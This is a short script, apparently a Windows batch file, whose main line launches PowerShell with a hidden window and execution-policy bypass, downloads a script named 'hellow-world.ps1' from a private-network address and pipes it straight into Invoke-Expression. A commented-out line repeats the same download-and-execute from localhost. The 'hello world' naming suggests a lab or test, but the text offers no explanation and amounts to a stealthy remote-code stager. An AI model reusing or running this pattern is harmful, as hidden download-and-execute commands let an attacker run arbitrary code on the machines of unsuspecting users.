powershell powershell -NoP -NonI -exec Bypass -WindowStyle Hidden -c "Set-ExecutionPolicy Bypass -Scope Process -Force; (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;(Invoke-WebRequest -Uri 'http://192.168.252.129:4080/Hello-World/assets/Scripts/hellow-world.ps1' -Method GET -ContentType 'text/plain; charset=utf-8' -UseBasicParsing)|iex"
rem powershell -NoP -NonI -exec Bypass -c "Set-ExecutionPolicy Bypass -Scope Process -Force;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials ;(Invoke-WebRequest -Uri 'http://localhost:80/Hello-World/assets/Scripts/hellow-world.ps1' -Method GET -ContentType 'text/plain; charset=utf-8' -UseBasicParsing)|iex"